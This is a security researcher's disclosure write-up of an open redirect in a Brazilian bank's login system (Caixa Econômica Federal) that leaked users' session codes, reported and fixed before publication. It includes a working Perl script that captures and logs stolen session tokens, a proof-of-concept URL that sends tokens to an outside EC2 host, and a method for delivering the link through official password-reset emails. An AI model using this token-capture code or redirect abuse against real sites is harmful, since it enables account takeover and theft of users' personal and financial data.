---
layout: content
title: 'From an Open Redirect in a Brazilian Bank to Session Token Leak'
description: 'Through a vulnerability on the financial institution website it was possible leak the users session token and realize a account takeover'
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

### Summary

I recently started to test the security of Web and Mobile Applications of some Brazilian banks that I use, I'm not sure why this initiative, maybe it's just the feeling of wanting to find more restricted vulnerabilities than the common ones. From that I found some vulnerabilities that surprised me somewhat, often being simple vulnerabilities that can be quickly fixed but have a significant impact.

In this post I want to share, an Open Redirect vulnerability[[1]](#references) that I found on the Caixa Econômica Federal website where I was able to leak the users' Session Token.

It is worth clarifying that during all tests the only account used was mine and no other accounts or information from other users were accessed or violated during the development of this research/proof of concept.

```
Timeline:

01/01/2020: Find of this vulnerability and made the proof of concept; 
01/05/2020: The vulnerability was reported;
01/07/2020: Confirmation from Caixa Economica Federal;
01/10/2020: This vulnerability was fixed;
01/10/2020: Full disclosure;
```

---

### Description

While browsing the web pages of the Caixa Federal systems, I came across an authentication screen where access credentials were requested:

![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)

-

This page is the authentication screen for access to the citizen portal panel and this caught my eye because I took a closer look at the URL structure of the page in question to understand a little more about the system, to my surprise there was a parameter that could probably lead me to find a vulnerability.

The URL in question was as follows:

[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login)


The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**; The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.

In order to validate this theory, I changed the value of the **&redirect_uri=** parameter in the original URL to the Google homepage address, filled in my credentials, logged in, and the result was as follows:

<iframe width="700" height="612" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

-

Well, here we have the Open Redirect vulnerability. To my surprise, however, I was not just redirected to the page, and during the redirect another parameter was sent. We can see this at the URL:

[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

This content in the **“?code=”** parameter aroused my curiosity. Understanding a little more of the original request, I was able to conclude that the value of this parameter is a Session Token.

As I understood this, it became apparent that this vulnerability was even more critical than it appeared, as the user could be redirected to a malicious URL where I had full control over it and capture the Session Token[[2]](#references). Doing so could access that user's account, thereby violating the confidentiality of their data and the integrity of it.

---

### Proof Of Concept

Determined to create a PoC from this theory, I wrote the following code:

```perl
#!/usr/bin/env perl
# Use: perl catcher.pl daemon -m production -l http://*:80

use 5.018;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
	$catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");
	
	my $code = $catcher -> param("code");
	
	open (my $logs, ">>", "catcher.logs");
	print $logs "[+] - New Session Token -> '$code' has been catch.\n";
	close ($logs);

	return ($catcher -> render (
		text => "<script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code';</script>"
	));
};

app -> start();
```
-

This code is responsible for capturing and storing Session Tokens what are sent to the "malicious" URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed. The PoC URL was as follows:

[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)

And this was the result:

<iframe width="700" height="612" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

--

The PoC performed was relatively simple, capturing only the Session Token, but other information could be captured, such as, but not limited to: User IP, Browser UserAgent. This way we could know your browser, operating system, screen size and other even more critical information - such information could be used for example to make a fingerprint of the user.

The attack surface here is still somewhat restricted, requiring the user to enter the URL of their own accord (through phishing and/or social engineering) and certain users are already aware of it, thinking about it, I kept looking a more convincing way to send this malicious link to the user.

-

Within minutes I could find a way to do this:

On the same page, there is a function to request the password change, in the button “Register/Forgot Password”, where the user's email or Social Security Number is requested. After filling in the information, a link to register the new password is sent. via email.

Asking for a new password from the malicious URL, the email content will be as follows:

![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)

-

The email is sent by an official Caixa Federal system, however, if we look at the link, we can see that the URL is "infected" by the URL under my ownership. I accessed the link, filled in the password reset and again the redirection worked, along with that, the Session Token Leak also happened.

This way, I can use this mechanism to send emails requesting a password reset on behalf of Caixa Econômica Federal, creating greater reliability for the user to access my malicious link, and this attack can be performed on a large scale, since I only need the target's CPF (Social Security Number).

---

### Impact

If an attacker exploits these vulnerabilities, he will be able to view some confidential user information, below I will leave some examples:

![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Full Name, CPF (Social Security Number), Last Access Date & Time

-

![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

- Full Name, PIS Number, Contracting Company, Work Card Number, FGTS Account, Admission Date, Total Account Balance and also the amount deposited each month during the period worked at the Company

-

![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- User's full address (You can change this data, password is not required)

---

### Conclusion

An attacker could easily exploit the vulnerabilities mentioned above and thus violate the confidentiality of various legitimate user accounts by accessing confidential information and in some cases also violating the integrity of some specific information.

The effort to perform this exploration is relatively small and simple, but the range of this attack is extremely large.

I strongly believe that this vulnerability was being exploited by malicious people to perform some types of scams by redirecting the user to phishing and related pages. I hope the Caixa Federal recognizes this scenario and conducts a survey to measure the real internal impact of this vulnerability and whether it was actually used by criminals.

---

### Referencies

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)